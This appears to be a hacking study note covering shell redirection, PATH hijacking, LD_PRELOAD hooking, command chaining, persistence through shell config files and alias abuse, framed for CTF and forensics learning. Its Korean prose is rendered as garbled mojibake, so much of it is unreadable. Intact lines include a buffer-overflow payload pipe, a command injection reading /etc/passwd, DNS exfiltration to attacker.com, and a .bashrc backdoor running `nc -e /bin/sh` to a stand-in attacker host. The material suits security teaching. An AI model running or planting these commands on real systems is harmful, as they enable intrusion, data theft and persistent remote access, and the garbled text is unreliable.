# 06_Shell_Env

ì‰˜ì˜ ë™ì‘ í™˜ê²½ì„ ì œì–´í•˜ëŠ” ë³€ìˆ˜ì™€ ì…ì¶œë ¥ íë¦„(Stream)ì„ ë‹¤ë£¬ë‹¤.
íŠ¹íˆ **í™˜ê²½ ë³€ìˆ˜ ì¡°ì‘**ì€ í•´í‚¹ ê¸°ë²•(Path Hijacking, Hooking)ì˜ í•µì‹¬ ì›ë¦¬ì´ë©°, íŒŒì´í”„ë¼ì¸ì€ CTF ë¬¸ì œ í’€ì´ì˜ í•„ìˆ˜ ìŠ¤í‚¬ì´ë‹¤.

---

## 1. Redirection & Piping (ì…ì¶œë ¥ ì œì–´)

**[Pwnable Essential]**
í‘œì¤€ ì…ë ¥/ì¶œë ¥ì˜ ë°©í–¥ì„ ë°”ê¿”, í‚¤ë³´ë“œ ëŒ€ì‹  íŒŒì¼ì´ë‚˜ ìŠ¤í¬ë¦½íŠ¸ì˜ ë‚´ìš©ì„ í”„ë¡œê·¸ë¨ì— ì£¼ì…í•œë‹¤.

### Redirection (`>`, `>>`, `<`)
* **`>` (Overwrite):** ëª…ë ¹ì–´ ê²°ê³¼ë¥¼ íŒŒì¼ì— ì €ì¥ (ê¸°ì¡´ ë‚´ìš© ì‚­ì œ).
    * `echo "Hacked" > index.html` (Defacement ê³µê²© ì‹œ ì‚¬ìš©)
* **`>>` (Append):** ëª…ë ¹ì–´ ê²°ê³¼ë¥¼ íŒŒì¼ ëì— ì¶”ê°€.
    * `cat stolen_data.txt >> /tmp/collection` (ë°ì´í„° ìˆ˜ì§‘ ì‹œ ì‚¬ìš©)
* **`<` (Input):** íŒŒì¼ì˜ ë‚´ìš©ì„ ëª…ë ¹ì–´ì˜ ì…ë ¥ìœ¼ë¡œ ë„£ìŒ.
* **`2>&1`:** í‘œì¤€ ì—ëŸ¬(2)ë¥¼ í‘œì¤€ ì¶œë ¥(1)ìœ¼ë¡œ í•©ì¹¨.
    * ì—ëŸ¬ ë©”ì‹œì§€ê¹Œì§€ í¬í•¨í•´ì„œ íŒŒì´í”„ë¥¼ íƒœìš°ê±°ë‚˜ ë¡œê·¸ë¥¼ ë‚¨ê¸¸ ë•Œ í•„ìˆ˜.

### Pipe (`|`)
ì• ëª…ë ¹ì–´ì˜ **ì¶œë ¥(Stdout)**ì„ ë’¤ ëª…ë ¹ì–´ì˜ **ì…ë ¥(Stdin)**ìœ¼ë¡œ ì—°ê²°í•œë‹¤.

> **ğŸ’¡ Exploit Scenario:** ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ê³µê²© ì‹œ, í‚¤ë³´ë“œë¡œ ì¹  ìˆ˜ ì—†ëŠ” ë°”ì´ë„ˆë¦¬ ê°’(ì‰˜ì½”ë“œ ë“±)ì„ ì…ë ¥í•´ì•¼ í•œë‹¤. ì´ë•Œ íŒŒì´ì¬ìœ¼ë¡œ í˜ì´ë¡œë“œë¥¼ ë§Œë“¤ê³  íŒŒì´í”„ë¡œ ë°€ì–´ ë„£ëŠ”ë‹¤.
> ```bash
> (python3 -c "print('A'*64 + '\xef\xbe\xad\xde')"; cat) | ./vulnerable_program
> ```
> * `cat`ì„ í•¨ê»˜ ì“°ëŠ” ì´ìœ : í˜ì´ë¡œë“œë¥¼ ë³´ë‚¸ í›„ ì—°ê²°ì„ ëŠì§€ ì•Šê³  ì‰˜ì„ ìœ ì§€í•˜ê¸° ìœ„í•¨(Trick).

---

## 2. Environment Variables (í™˜ê²½ ë³€ìˆ˜)

í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰ë  ë•Œ ì°¸ì¡°í•˜ëŠ” ì „ì—­ ë³€ìˆ˜ë“¤. `export` ëª…ë ¹ì–´ë¡œ ì„¤ì •í•˜ê³  `env`ë¡œ í™•ì¸í•œë‹¤.

### ä¸»è¦ ë³€ìˆ˜ì™€ ë³´ì•ˆ ê´€ì 
1.  **`PATH`**: ì‹¤í–‰ íŒŒì¼ì„ ì°¾ëŠ” ê²½ë¡œ ìˆœì„œ.
    * **[Attack Vector] Path Hijacking:**
        * ì–´ë–¤ í”„ë¡œê·¸ë¨ì´ ì ˆëŒ€ ê²½ë¡œ(`/bin/ls`)ê°€ ì•„ë‹Œ ìƒëŒ€ ê²½ë¡œ(`ls`)ë¡œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œë‹¤ë©´?
        * í•´ì»¤ê°€ `/tmp/ls`ë¼ëŠ” ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë§Œë“¤ê³ , `export PATH=/tmp:$PATH`ë¥¼ í•´ë²„ë¦¬ë©´ ì›ë³¸ `ls` ëŒ€ì‹  ì•…ì„± `ls`ê°€ ì‹¤í–‰ëœë‹¤.
2.  **`HOME`**: ì‚¬ìš©ìì˜ í™ˆ ë””ë ‰í† ë¦¬ ê²½ë¡œ. (`~`ê°€ ì´ ë³€ìˆ˜ë¥¼ ì°¸ì¡°í•¨)
3.  **`USER` / `LOGNAME`**: í˜„ì¬ ì‚¬ìš©ì ì´ë¦„.
4.  **`PS1`**: í”„ë¡¬í”„íŠ¸ ëª¨ì–‘ ì„¤ì •. (í•´í‚¹ê³¼ ì§ì ‘ ê´€ë ¨ì€ ì ìŒ)

### `LD_PRELOAD` (The Ultimate Cheat Key)
**[Advanced System Hacking]**
í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë  ë•Œ **ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬(Shared Library)ë¥¼ ê°•ì œë¡œ ë¨¼ì € ë¡œë”©**í•˜ê²Œ ë§Œë“œëŠ” ë³€ìˆ˜.

* **Use Case:**
    * **Function Hooking:** í”„ë¡œê·¸ë¨ì´ ì‚¬ìš©í•˜ëŠ” `strcmp`, `rand` ê°™ì€ í•¨ìˆ˜ë¥¼ ë‚´ê°€ ì§  í•¨ìˆ˜ë¡œ ë°”ê¿”ì¹˜ê¸°í•  ìˆ˜ ìˆë‹¤.
    * **CTF Tip:** ëœë¤ ê°’(`rand()`)ì„ ê³ ì •í•˜ê±°ë‚˜, ì‹œê°„(`time()`)ì„ ì¡°ì‘í•´ì•¼ í’€ë¦¬ëŠ” ë¬¸ì œì—ì„œ ì‚¬ìš©í•œë‹¤.
    * `export LD_PRELOAD=./my_hack.so`

---

## 3. Command Chaining (ëª…ë ¹ì–´ ì—°ê²°)

í•œ ì¤„ì— ì—¬ëŸ¬ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜, ì¡°ê±´ë¶€ë¡œ ì‹¤í–‰í•œë‹¤. **Command Injection(ì›¹ í•´í‚¹)** ì·¨ì•½ì  ê³µê²©ì˜ ë¬¸ë²•ì´ê¸°ë„ í•˜ë‹¤.

| ì—°ì‚°ì | ì„¤ëª… | Injection Example |
| :---: | :--- | :--- |
| **`;`** | **ë¬´ì¡°ê±´** ë‹¤ìŒ ëª…ë ¹ ì‹¤í–‰. (ì•ì—ê²Œ ì‹¤íŒ¨í•´ë„ ì‹¤í–‰) | `ping 127.0.0.1; cat /etc/passwd` |
| **`&&`** | ì• ëª…ë ¹ì–´ê°€ **ì„±ê³µ**í•´ì•¼ ë’¤ ì‹¤í–‰. (AND) | `mkdir test && cd test` |
| **`||`** | ì• ëª…ë ¹ì–´ê°€ **ì‹¤íŒ¨**í•´ì•¼ ë’¤ ì‹¤í–‰. (OR) | `grep "flag" file || echo "Not Found"` |
| **`$()`** | **ëª…ë ¹ì–´ ì¹˜í™˜.** ê´„í˜¸ ì•ˆì˜ ì‹¤í–‰ ê²°ê³¼ë¥¼ ë¬¸ìë¡œ ë°”ê¿ˆ. | `echo "I am $(whoami)"` |
| **`` ` ``** | ë°±í‹±(Backtick). `$()`ì™€ ë™ì¼ ê¸°ëŠ¥. | `` ping `whoami`.attacker.com `` (DNS Exfiltration) |

---

## 4. Shell Configuration Files (Persistence)

ì‰˜ì´ ì‹œì‘ë  ë•Œ ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ë“¤.

* **`~/.bashrc`**: í„°ë¯¸ë„ì„ ì—´ ë•Œë§ˆë‹¤ ì‹¤í–‰ë¨. (Non-login shell)
* **`~/.bash_profile`** (ë˜ëŠ” `.profile`): ë¡œê·¸ì¸í•  ë•Œ í•œ ë²ˆ ì‹¤í–‰ë¨.

> **ğŸ’¡ Forensics & Malware Tip:**
> ê³µê²©ìëŠ” ì‹œìŠ¤í…œì— ì¹¨íˆ¬í•œ ë’¤, **ì§€ì†ì„±(Persistence)**ì„ ìœ ì§€í•˜ê¸° ìœ„í•´ ì´ íŒŒì¼ë“¤ì— ë°±ë„ì–´ ì‹¤í–‰ ì½”ë“œë¥¼ í•œ ì¤„ ëª°ë˜ ë„£ì–´ë‘”ë‹¤.
> * ì˜ˆ: `.bashrc` ë§¨ ì•„ë˜ì— `nc -e /bin/sh attacker.ip 4444 &` ë¥¼ ì¶”ê°€í•˜ë©´, ê´€ë¦¬ìê°€ í„°ë¯¸ë„ì„ ì—´ ë•Œë§ˆë‹¤ í•´ì»¤ì—ê²Œ ì‰˜ì´ ì—°ê²°ëœë‹¤.

---

## 5. Alias (ë³„ì¹­)

ê¸´ ëª…ë ¹ì–´ë¥¼ ì§§ê²Œ ì¤„ì—¬ ì“´ë‹¤.

* **Usage:** `alias name='command'`
* **Example:**
    * `alias ll='ls -alF'`
    * `alias update='sudo apt update && sudo apt upgrade'`
* **Security Risk:**
    * ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ `alias sudo='Capture_Password_Script'` ì²˜ëŸ¼ ì„¤ì •í•˜ì—¬ ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ê°€ë¡œì±Œ ìˆ˜ë„ ìˆë‹¤.
    * ë”°ë¼ì„œ í¬ë Œì‹ ë¶„ì„ì´ë‚˜ ì¹¨í•´ ì‚¬ê³  ëŒ€ì‘ ì‹œì—ëŠ” `unalias -a`ë¡œ ëª¨ë“  ë³„ì¹­ì„ ë„ê±°ë‚˜, ì ˆëŒ€ ê²½ë¡œ(`/bin/ls`)ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì•ˆì „í•˜ë‹¤.
